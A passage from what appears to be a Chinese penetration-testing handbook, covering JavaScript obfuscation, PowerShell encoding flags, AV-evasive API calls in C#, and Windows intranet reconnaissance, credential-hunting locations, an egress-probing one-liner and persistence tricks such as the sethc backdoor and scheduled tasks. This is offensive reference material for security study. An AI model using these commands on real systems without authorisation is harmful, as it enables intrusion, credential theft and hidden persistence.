</span><span>[</span><span>]</span><span>+</span><span>[</span><span>]</span></li><li><span>&#39;</span><span>undefined</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>+</span><span>[</span><span>]</span><span>[</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>false</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>+!</span><span>[</span><span>]</span></li><li><span>&#39;</span><span>true</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>+!!</span><span>[</span><span>]</span></li><li><span>&#39;</span><span>NaN</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>+(+</span><span>[</span><span>!</span><span>[</span><span>]</span><span>]</span><span>)</span></li><li><span>&#39;</span><span>0</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>+(+</span><span>[</span><span>]</span><span>)</span></li><li><span>&#39;</span><span>1</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>+(+!+</span><span>[</span><span>]</span><span>)</span></li><li><span>&#39;</span><span>2</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>]</span><span>+(!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>)</span></li><li><span>&#39;</span><span>10</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span><span>+</span><span>[</span><span>+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>11</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span><span>+</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>100</span><span>&#39;</span><span> </span><span>&gt;</span><span> </span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span><span>+</span><span>[</span><span>+</span><span>[</span><span>]</span><span>]</span><span>+(+</span><span>[</span><span>]</span><span>)</span></li></ul><h4 id='higher-numbers'><span>Higher numbers</span></h4><ul><li><span>10 </span><span>&gt;</span><span> +(</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span><span>+</span><span>[</span><span>+</span><span>[</span><span>]</span><span>]</span><span>)</span></li><li><span>11 </span><span>&gt;</span><span> +(</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span><span>+</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span><span>)</span></li><li><span>100 </span><span>&gt;</span><span> +(</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span><span>+</span><span>[</span><span>+</span><span>[</span><span>]</span><span>]</span><span>+(+</span><span>[</span><span>]</span><span>))</span></li></ul><h4 id='string-alphabet'><span>String alphabet</span></h4><ul><li><span>&#39;</span><span>a</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>d</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+</span><span>[</span><span>]</span><span>[</span><span>[</span><span>]</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>e</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>f</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>i</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+</span><span>[</span><span>]</span><span>[</span><span>[</span><span>]</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>l</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>n</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+</span><span>[</span><span>]</span><span>[</span><span>[</span><span>]</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>r</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>s</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>t</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+</span><span>[</span><span>]</span><span>]</span></li><li><span>&#39;</span><span>u</span><span>&#39;</span><span> </span><span>&gt;</span><span> (</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>)</span><span>[</span><span>+!+</span><span>[</span><span>]</span><span>+!+</span><span>[</span><span>]</span><span>]</span></li></ul><h3 id='trick-2'><span>Trick</span></h3><blockquote><p><strong><span>通过正则表达式构造特定字符</span></strong></p></blockquote><h3 id='其他-2'><span>其他</span></h3><h4 id='命令执行-3'><span>命令执行</span></h4><blockquote><p><span>Node.js 中 child_process.exec 命令调用的是 /bin/sh ，故可以直接使用该命令执行 shell</span></p></blockquote><h4 id='反调试技巧'><span>反调试技巧</span></h4><ul><li><span>函数重定义 console.log = function(a){}</span></li><li><span>定时断点 setInterval(function(){debugger}, 1000);</span></li></ul><h4 id='对象拷贝'><span>对象拷贝</span></h4><blockquote><p><span>JavaScript 中的对象拷贝分为浅拷贝和深拷贝。</span></p><p><span>浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。</span></p><p><span>深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。</span></p><p><span>深拷贝可以基于 for-in / object.assign() / 拓展运算符 </span><span>.</span><span>.. / JSON.parse(JSON.stringify()) 等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。</span></p></blockquote><h4 id='常见-sink-2'><span>常见 Sink</span></h4><ul><li><span>child_process</span></li><li><span>eval</span></li><li><span>exec</span></li><li><span>execSync</span></li></ul><ol start='10' ><li><h3 id='参考链接-参考链接-26'><span>参考链接 {#参考链接-26}</span></h3><ul><li><a href='http://www.freebuf.com/articles/system/163579.html'><span>JavaScript 反调试技巧</span></a></li><li><a href='http://www.ecma-international.org/ecma-262/5.1/#sec-15.3.4.5'><span>ECMAScript Language Specification</span></a></li><li><a href='https://www.zhihu.com/question/34183746?sort=created'><span>js prototype</span></a></li><li><a href='https://github.com/scscms/guardJs/'><span>javascript 防劫持</span></a></li><li><a href='http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3.html'><span>XSS 前端防火墙</span></a></li><li><a href='https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/'><span>exploiting node js deserialization bug for remote code execution</span></a></li><li><a href='https://github.com/HoLyVieR/prototype-pollution-nsec18/'><span>Prototype pollution attack</span></a><span> Content released at NorthSec 2018 on prototype pollution</span></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h2 id='golang'><span>Golang</span></h2><ol start='' ><li><h3 id='golang-runtime'><span>Golang Runtime</span></h3></li></ol></li></ol><blockquote><p><span>Go 中的线程被称为 Goroutine 或 G，内核线程被称为 M。这些 G 被调度到 M 上，即所谓的 G：M 线程模型，或更常用的 M：N 线程模型，用户空间线程或 green 线程模型。</span></p></blockquote><ol start='2' ><li><h3 id='字符串处理'><span>字符串处理</span></h3><ul><li><span>Go 源代码始终为 UTF-8</span></li><li><span>代表 Unicode 码点的字节序列称为 rune</span></li><li><span>Go 不保证字符串中的字符被规范化</span></li><li><span>字符串可以包含任意字节</span></li><li><span>字符串中不包含字节级转义符时，字符串始终包含有效的 UTF-8 序列</span></li></ul></li><li><h3 id='参考链接-参考链接-27'><span>参考链接 {#参考链接-27}</span></h3><ul><li><a href='https://blog.golang.org/strings'><span>Strings, bytes, runes and characters in Go</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='2' ><li><h2 id='ruby-2'><span>Ruby</span></h2><ol start='' ><li><h3 id='参考链接-参考链接-28'><span>参考链接 {#参考链接-28}</span></h3><ul><li><a href='https://www.elttam.com.au/blog/ruby-deserialization/'><span>ruby deserialization</span></a></li></ul></li></ol></li><li><h1 id='asp'><span>ASP</span></h1><ol start='' ><li><h3 id='简介-32'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>ASP 是动态服务器页面 (Active Server Page)，是微软开发的类似 CGI 脚本程序的一种应用，其网页文件的格式是 .asp 。</span></p></blockquote><ol start='2' ><li><h3 id='参考链接-参考链接-29'><span>参考链接 {#参考链接-29}</span></h3><ul><li><a href='https://www.cnblogs.com/LittleHann/p/5016999.html'><span>Deformity ASP/ASPX Webshell、Webshell Hidden Learning</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='4' ><li><h2 id='powershell-1'><span>PowerShell</span></h2><ol start='' ><li><h3 id='执行策略'><span>执行策略</span></h3></li></ol></li></ol><blockquote><p><span>PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略。</span></p><p><span>Restricted 策略可以执行单个的命令，但是不能执行脚本，Windows 8、Windows Server 2012 中默认使用该策略。</span></p><p><span>AllSigned 策略允许执行所有具有数字签名的脚本。</span></p><p><span>RemoteSigned 当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</span></p><p><span>Unrestricted 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>BypassBypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并 不会有安全性提示。</span></p><p><span>UndefinedUndefined 表示没有设置脚本策略，会继承或使用默认的脚本策略。</span></p></blockquote><ol start='2' ><li><h3 id='混淆-1'><span>混淆</span></h3><ul><li><span>-EC</span></li><li><span>-EncodedCommand</span></li><li><span>-EncodedComman</span></li><li><span>-EncodedComma</span></li><li><span>-EncodedComm</span></li></ul></li><li><h3 id='常见功能-1'><span>常见功能</span></h3></li></ol><h4 id='计划任务-1'><span>计划任务</span></h4><blockquote><p><strong><span>创建链接</span></strong></p></blockquote><p><span>(下页继续)</span></p><h4 id='58-powershell-219'><span>5.8. PowerShell 219</span></h4><p><span>(续上页)</span></p><blockquote><p><strong><span>编码</span></strong></p><p><strong><span>其他</span></strong></p></blockquote><ul><li><p><strong><span>别名</span></strong></p><ul><li><span>alias</span></li></ul></li><li><h4 id='下载文件'><span>下载文件</span></h4><ul><li><span>Invoke-WebRequest </span><span>&quot;</span><a href='https://example.com/test.zip' target='_blank' class='url'>https://example.com/test.zip</a><span>&quot;</span><span> -OutFile </span><span>&quot;</span><span>$</span><span>env:TEMP</span><span>\</span><span>test. zip</span><span>&quot;</span></li></ul></li><li><p><strong><span>解压缩</span></strong></p></li><li><p><strong><span>进程</span></strong></p></li><li><p><strong><span>文件</span></strong></p></li><li><p><strong><span>服务</span></strong></p></li></ul><p>&nbsp;</p><ul><li><p><span>Expand-Archive </span><span>$</span><span>env:TEMP</span><span>\</span><span>test.zip </span><span>$</span><span>env:TEMP</span><span>\</span><span>test -Force</span></p></li><li><p><span>启动进程 Start-Process calc</span></p></li><li><p><span>停止进程 Stop-Process -ID </span><span>$</span><span>pid</span></p></li><li><p><span>新建文件 New-Item #{file_path} -Force </span><span>|</span><span> Out-Null</span></p></li><li><p><span>设置文件内容 Set-Content -Path #{file_path} -Value </span><span>&quot;</span><span>#{Content}</span><span>&quot;</span></p></li><li><p><span>追加文件内容 Add-Content -Path #{file_path} -Value </span><span>&quot;</span><span>#{Content}</span><span>&quot;</span></p></li><li><p><span>复制文件 Copy-Item src dst</span></p></li><li><p><span>删除文件 Remove-Item #{outputfile} -Force -ErrorAction Ignore</span></p></li><li><p><span>子目录 Get-ChildItem #{file_path}</span></p><ul><li><span>获取服务 Get-Service -Name </span><span>&quot;</span><span>#{service_name}</span><span>&quot;</span></li><li><span>启动服务 Start-Service -Name </span><span>&quot;</span><span>#{service_name}</span><span>&quot;</span></li><li><span>停止服务 Stop-Service -Name </span><span>&quot;</span><span>#{service_name}</span><span>&quot;</span></li><li><span>删除服务 Remove-Service -Name </span><span>&quot;</span><span>#{service_name}</span><span>&quot;</span></li></ul></li></ul><p>&nbsp;</p><ul><li><p><span>获取 WMI 支持 Get-WmiObject -list</span></p><ol start='' ><li><h3 id='参考链接-参考链接-30'><span>参考链接 {#参考链接-30}</span></h3><ul><li><a href='https://docs.microsoft.com/zh-cn/powershell/'><span>PowerShell 官方文档</span></a></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h2 id='shell'><span>Shell</span></h2><ol start='' ><li><h3 id='简介-33'><span>简介</span></h3></li></ol></li></ol></li></ul><blockquote><p><span>Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。</span></p><p><span>Linux 包含多种 Shell ，常见的有：</span></p></blockquote><ul><li><span>Bourne Shell（ATT 的 Bourne 开发，名为 sh）</span></li><li><span>Bourne Again Shell（/bin/bash）</span></li><li><span>C Shell（Bill Joy 开发，名为 csh）</span></li><li><span>K Shell（ATT 的 David G.koun 开发，名为 ksh）</span></li><li><span>Z Shell（Paul Falstad 开发，名为 zsh）</span></li></ul><h3 id='元字符'><span>元字符</span></h3><blockquote><p><span>shell 一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的 Shell 支持的元字符可能会不相同。</span></p><p><span>常见的元字符如下：</span></p></blockquote><ul><li><span>IFS 由 </span><span>&lt;</span><span>space</span><span>&gt;</span><span> 或 </span><span>&lt;</span><span>tab</span><span>&gt;</span><span> 或 </span><span>&lt;</span><span>enter</span><span>&gt;</span><span> 三者之一组成</span></li><li><span>CR 由 </span><span>&lt;</span><span>enter</span><span>&gt;</span><span> 产生。</span></li></ul><blockquote><p><span>• = 设定变量</span></p></blockquote><ul><li><span>$</span><span> 作变量或运算替换</span></li><li><span>&gt;</span><span> 重定向 stdout</span></li><li><span>&gt;</span><span>&gt;</span><span> 追加到文件</span></li><li><span>&lt;</span><span> 重定向 stdin</span></li><li><span>|</span><span> 命令管道</span></li><li><span>&amp; 后台执行命令</span></li><li><span>; 在前一个命令结束后，执行下一个命令</span></li><li><span>&amp;&amp; 在前一个命令未报错执行后，执行下一个命令</span></li><li><span>|</span><span>|</span><span> 在前一个命令执行报错后，执行下一个命令</span></li><li><span>&#39;</span><span> 在单引号内的命令会保留原来的值</span></li><li><span>&quot;</span><span> 在双引号内的命令会允许变量替换</span></li><li>‘’<span> </span>’<span> </span>‘’<span> 在反引号内的内容会当成命令执行并替换</span></li><li><span>() 在子 Shell 中执行命令</span></li><li><span>{} 在当前 Shell 中执行命令</span></li><li><span>~</span><span> 当前用户的主目录</span></li><li><span>!number 执行历史命令，如 !1</span></li></ul><h3 id='通配符-3'><span>通配符</span></h3><blockquote><p><span>除元字符外，通配符（wildcard）也是 shell 中的一种特殊字符。当 shell 在参数中遇到了通配符时，shell 会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。</span></p><p><span>常见的通配符如下：</span></p></blockquote><ul><li><span>*</span><span> 匹配 0 或多个字符</span></li><li><span>? 匹配任意一个字符</span></li><li><span>[</span><span>list</span><span>]</span><span> 匹配 list 中的任意一个字符</span></li><li><span>[</span><span>!list</span><span>]</span><span> 匹配除 list 外的任意一个字符</span></li><li><span>[</span><span>a-c</span><span>]</span><span> 匹配 a-c 中的任意一个字符</span></li><li><span>{string1,string2,</span><span>.</span><span>..} 分别匹配其中字符串</span></li></ul><ol start='2' ><li><h2 id='csharp'><span>CSharp</span></h2><ol start='' ><li><h3 id='利用技巧-1'><span>利用技巧</span></h3></li></ol></li></ol><h4 id='pinvoke'><span>P/Invoke</span></h4><blockquote><p><span>Platform Invoke (P/Invoke) 提供了 C# 访问 DLL 中数据结构、回调、函数的能力。基本的使用方式如官方</span></p><p><a href='https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke'><span>Platform Invoke</span></a><span> 文档中所示。利用 P/Invoke 的能力，C# 程序可以较为容易的调用标准的 Windows API。</span></p><p><span>P/Invoke 的缺点在于引用了的 API 调用会最后出现在可执行文件的 IAT 中，使得一些敏感的行为容易被防护软件所注意。同时一些敏感的 API 可能是被防护软件所监控的，通过这种方式进行的 API 调用也容易被防护软件拦截。</span></p></blockquote><h4 id='dinvoke'><span>D/Invoke</span></h4><blockquote><p><span>在 P/Invoke 的基础上，有研究人员提出了基于 </span><a href='https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/'><span>Delegates</span></a><span> 机制的 D/Invoke，通过更隐蔽的方式来调用所需的 API。</span></p></blockquote><h3 id='参考链接-参考链接-31'><span>参考链接 {#参考链接-31}</span></h3><h4 id='net'><span>.Net</span></h4><ul><li><a href='https://docs.microsoft.com/en-us/dotnet/fundamentals/'><span>.NET documentation</span></a></li></ul><h4 id='利用技巧-2'><span>利用技巧</span></h4><ul><li><a href='https://thewover.github.io/Dynamic-Invoke/'><span>Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)</span></a></li></ul><p><span id="_bookmark54" class="anchor"></span><span>CHAPTER 6</span></p><p><span>内网渗透</span></p><ol start='' ><li><h2 id='windows-内网渗透'><span>Windows 内网渗透</span></h2><ol start='' ><li><h3 id='信息收集-信息收集-1'><span>信息收集 {#信息收集-1}</span></h3></li></ol></li></ol><h4 id='基本命令'><span>基本命令</span></h4><ul><li><p><span>主机名 hostname</span></p></li><li><p><span>查询所有计算机名称 dsquery computer</span></p></li><li><h4 id='查看配置及补丁信息'><span>查看配置及补丁信息</span></h4><ul><li><span>systeminfo</span></li><li><span>wmic qfe get description,installedOn /format:csv</span></li></ul></li><li><p><span>查看版本 ver</span></p></li><li><h4 id='进程信息-1'><span>进程信息</span></h4><ul><li><span>tasklist /svc</span></li><li><span>wmic process get caption,executablepath,commandline /format:csv</span></li><li><span>get-process</span></li></ul></li><li><p><span>查看所有环境变量 set</span></p></li><li><p><span>查看计划任务 schtasks /QUERY /fo LIST /v</span></p></li></ul><h4 id='225'><span>225</span></h4><ul><li><p><span>查看安装驱动 DRIVERQUERY</span></p></li><li><h4 id='查看操作系统信息'><span>查看操作系统信息</span></h4><ul><li><span>架构 wmic os get osarchitecture</span></li><li><span>系统名 wmic os get caption</span></li></ul></li><li><p><span>查看逻辑盘 wmic logicaldisk get caption</span></p></li><li><p><span>查看安装的软件信息 wmic product get name,version</span></p></li><li><h4 id='查看服务信息'><span>查看服务信息</span></h4><ul><li><span>wmic service list brief</span></li><li><span>sc query</span></li><li><span>Get-WmiObject win32_service </span><span>|</span><span> select PathName</span></li></ul></li></ul><h4 id='域信息'><span>域信息</span></h4><ul><li><p><span>获取当前组的计算机名 net view</span></p></li><li><p><span>网络发现 net view /all</span></p></li><li><p><span>查看所有域 net view /domain</span></p></li><li><p><span>域森林、域树信息</span></p></li><li><p><span>域信任信息 nltest /domain_trusts</span></p></li><li><p><span>定位域控 net time /domain</span></p></li><li><p><span>查看域中的用户名 dsquery user</span></p></li><li><p><span>查询域组名称 net group /domain</span></p></li><li><p><span>查询域管理员 net group </span><span>&quot;</span><span>Domain Admins</span><span>&quot;</span><span> /domain</span></p></li><li><h4 id='域控信息'><span>域控信息</span></h4><ul><li><span>nltest /dclist:xx</span></li><li><span>Get-NetDomain</span></li><li><span>Get-NetDomainController</span></li><li><span>net group </span><span>&quot;</span><span>Domain controllers</span><span>&quot;</span></li></ul></li><li><p><span>组策略</span></p></li></ul><h4 id='用户信息-2'><span>用户信息</span></h4><ul><li><p><strong><span>查看用户</span></strong></p><ul><li><span>net user</span></li><li><span>whoami / whoami /priv / whoami /all</span></li><li><span>wmic useraccount get /ALL /format:csv</span></li></ul></li><li><p><span>用户特权信息 whoami /priv</span></p></li><li><p><span>查看当前权限 net localgroup administrators</span></p></li><li><p><span>查看在线用户 quser / qwinsta / query user</span></p></li><li><p><span>查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域 net config Workstation</span></p></li><li><p><span>ACL 信息 get-acl</span></p></li></ul><h4 id='网络信息'><span>网络信息</span></h4><ul><li><p><span>内网网段信息</span></p></li><li><p><span>网卡信息 ipconfig</span></p></li><li><p><span>外网出口</span></p></li><li><p><span>ARP 表 arp -a</span></p></li><li><p><span>路由表 route print</span></p></li><li><p><span>监听的端口 netstat -ano</span></p></li><li><p><span>连接的端口</span></p></li><li><h4 id='端口信息'><span>端口信息</span></h4><ul><li><span>Get-NetTCPConnection</span></li></ul></li><li><p><span>hosts 文件</span></p></li><li><p><span>主备 DNS</span></p></li><li><h4 id='dns-缓存'><span>DNS 缓存</span></h4><ul><li><span>ipconfig /displaydns</span></li><li><span>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</span></li></ul></li><li><h4 id='探测出网情况'><span>探测出网情况</span></h4><ul><li><em><span>powershell -c </span>“<span>1..65535 </span><span>|</span><span> % {echo ((new-object Net.Sockets.TcpClient).Connect(</span>‘<span>allports.exposed</span>’<span>,</span><span>$</span><span>_</span><span>))</span></em></li></ul></li></ul><blockquote><p><em><span>$</span><span>_</span><span> } 2</span><span>&gt;</span><span>$</span><span>null</span>”</em></p></blockquote><h4 id='防火墙-1'><span>防火墙</span></h4><ul><li><span>查看防火墙状态 netsh advfirewall show allprofiles</span></li><li><span>防火墙日志目录 netsh firewall show logging</span></li><li><span>防火墙规则 netsh advfirewall firewall show rule name=all</span></li><li><span>netsh firewall show config</span></li><li><span>netsh firewall show state</span></li></ul><h4 id='密码信息'><span>密码信息</span></h4><ul><li><p><span>Windows RDP 连接记录</span></p></li><li><p><span>浏览器中保存的账号密码</span></p></li><li><p><span>系统密码管理器中的各种密码</span></p></li><li><h4 id='无人值守安装文件中的密码信息'><span>无人值守安装文件中的密码信息</span></h4><ul><li><span>C:</span><span>\</span><span>sysprep.inf</span></li><li><span>C:</span><span>\</span><span>sysprep</span><span>\</span><span>sysprep.xml</span></li><li><span>C:</span><span>\</span><span>Windows</span><span>\</span><span>Panther</span><span>\</span><span>Unattend</span><span>\</span><span>Unattended.xml</span></li><li><span>C:</span><span>\</span><span>Windows</span><span>\</span><span>Panther</span><span>\</span><span>Unattended.xml</span></li></ul></li></ul><h4 id='票据信息'><span>票据信息</span></h4><ul><li><span>cmdkey /l</span></li><li><span>klist</span></li><li><span>msf meterpreter</span></li></ul><h4 id='特殊文件'><span>特殊文件</span></h4><ul><li><strong><span>文档</span></strong></li></ul><p>&nbsp;</p><ul><li><p><span>xlsx / xls</span></p></li><li><p><span>docx / doc</span></p></li><li><p><span>pptx / ppt</span></p></li><li><p><span>vsdx / vsd</span></p></li><li><p><span>md / txt</span></p><ul><li><h4 id='压缩文件'><span>压缩文件</span></h4><ul><li><span>zip / rar / 7z</span></li></ul></li><li><h4 id='vpn-配置'><span>VPN 配置</span></h4><ul><li><span>ovpn</span></li></ul></li><li><h4 id='代码'><span>代码</span></h4><ul><li><span>py / php / jsp / aspx / asp / sql</span></li></ul></li><li><h4 id='配置文件'><span>配置文件</span></h4><ul><li><span>conf / ini / xml</span></li></ul></li><li><h4 id='特定关键字'><span>特定关键字</span></h4><ul><li><span>账号 / 账户 / 登录 / login / user</span></li><li><span>密码 / pass</span></li><li><span>代码 / 文档 / 交接 / 备份 / git / svn</span></li><li><span>邮箱 / 通讯录 / 集群 / 办公</span></li><li><span>代理 / 内网 / VPN</span></li><li><span>设备 / 资产</span></li><li><span>系统 / 运维 / 拓扑 / 网络 / IT</span></li><li><span>后台 / 管理员 / 数据库</span></li><li><span>监控 / 隔离 / 防火墙 / 网闸 / 巡检</span></li></ul></li></ul></li></ul><h4 id='局域网存活主机'><span>局域网存活主机</span></h4><ul><li><span>NetBIOS 扫描</span></li><li><span>OXID 扫描</span></li></ul><h4 id='其他-3'><span>其他</span></h4><ul><li><p><span>启用的共享文件夹</span></p></li><li><p><span>回收站</span></p></li><li><p><span>最近运行的命令</span></p></li><li><p><span>访问文件历史记录</span></p></li><li><h4 id='查看补丁安装情况'><span>查看补丁安装情况</span></h4><ul><li><span>wmic qfe get Caption,Description,HotFixID,InstalledOn</span></li></ul></li><li><h4 id='日志与事件信息'><span>日志与事件信息</span></h4><ul><li><span>wevtutil</span></li><li><span>eventvwr</span></li></ul></li><li><h4 id='注册表信息'><span>注册表信息</span></h4><ul><li><span>reg</span></li></ul></li><li><p><span>安装的各类 agent 监控软件</span></p></li><li><p><span>安装的杀毒软件</span></p></li><li><h4 id='查看设置后缀关联'><span>查看/设置后缀关联</span></h4><ul><li><span>assoc</span></li><li><span>assoc .ext=example</span></li></ul></li><li><p><span>PowerShell 版本</span></p></li><li><p><span>.Net 版本</span></p></li><li><p><span>Wi-Fi 密码</span></p><ol start='' ><li><h3 id='持久化-2'><span>持久化</span></h3></li></ol></li></ul><h4 id='隐藏文件'><span>隐藏文件</span></h4><ul><li><p><strong><span>创建系统隐藏文件</span></strong></p><ul><li><span>attrib +s +a +r +h filename / attrib +s +h filename</span></li></ul></li><li><p><span>利用 NTFS ADS (Alternate Data Streams) 创建隐藏文件</span></p></li><li><h4 id='利用-windows-保留字'><span>利用 Windows 保留字</span></h4><ul><li><span>aux</span><span>|</span><span>prn</span><span>|</span><span>con</span><span>|</span><span>nul</span><span>|</span><span>com1</span><span>|</span><span>com2</span><span>|</span><span>com3</span><span>|</span><span>com4</span><span>|</span><span>com5</span><span>|</span><span>com6</span><span>|</span><span>com7</span><span>|</span><span>com8</span><span>|</span><span>com9</span><span>|</span><span>lpt1</span><span>|</span><span>lpt2</span><span>|</span><span>lpt3</span><span>|</span><span>lpt4</span><span>|</span><span>lpt5</span><span>|</span><span>lpt6</span></li></ul></li></ul><h4 id='后门-2'><span>后门</span></h4><blockquote><p><strong><span>sethc</span></strong></p><p><span>sethc.exe 是 Windows 系统在用户按下五次 shift 后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 sethc.exe 的方式留下后门，在密码输入页面输入五次 shift 即可获得权限。</span></p></blockquote><h4 id='映像劫持'><span>映像劫持</span></h4><blockquote><p><span>在高版本的 Windows 中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</span></p><p><span>具体操作为在注册表的 HKEY_LOCAL_MACHINE</span><span>\</span><span>SOFTWARE</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows NT</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Image File Execution Option 下添加项 sethc.exe ，然后在 sethc.exe 这个项中添加 debugger 键，键值为恶意程序的路径。</span></p></blockquote><h4 id='定时任务'><span>定时任务</span></h4><blockquote><p><span>Windows 下有 schtasks 和 at 两种计划任务机制。其中 at 在较高版本的 Windows 中已经弃用。</span></p><p><span>设置命令为 schtasks /create /tn </span><span>&quot;</span><span>TEST_OnLogon</span><span>&quot;</span><span> /sc onlogon /tr </span><span>&quot;</span><span>cmd.exe /c calc.exe</span><span>&quot;</span><span> 、 schtasks /create /tn </span><span>&quot;</span><span>TEST_OnStartup</span><span>&quot;</span><span> /sc onstart /ru system /tr </span><span>&quot;</span><span>cmd.exe /c calc.exe</span><span>&quot;</span><span> 。删除命令为 schtasks /delete /tn </span><span>&quot;</span><span>TEST_OnLogon</span><span>&quot;</span><span> /f 。</span></p></blockquote><h4 id='登录脚本'><span>登录脚本</span></h4><blockquote><p><span>Windows 可 以 在 用 户 登 录 前 执 行 脚 本， 使 用 HKLM</span><span>\</span><span>SOFTWARE</span><span>\</span><span>Microsoft</span><span>\</span><span>Windows NT</span><span>\</span><span>CurrentVersion</span><span>\</span><span>Winlogon</span><span>\</span><span>Userinit 设置。</span></p><p><span>也可在 HKCU</span><span>\</span><span>Environment</span><span>\</span><span> 路径下设置 UserInitMprLogonScript 来实现。</span></p></blockquote><h4 id='屏幕保护程序'><span>屏幕保护程序</span></h4><blockquote><p><span>Windows 可以自定义屏幕保护程序，使用 HKEY_CURRENT_USER</span><span>\</span><span>Control Panel</span><span>\</span><span>Desktop 设置。</span></p></blockquote><h4 id='隐藏用户'><span>隐藏用户</span></h4><blockquote><p><span>Windows 可以使用在用户名后加入 </span><span>$</span><span> 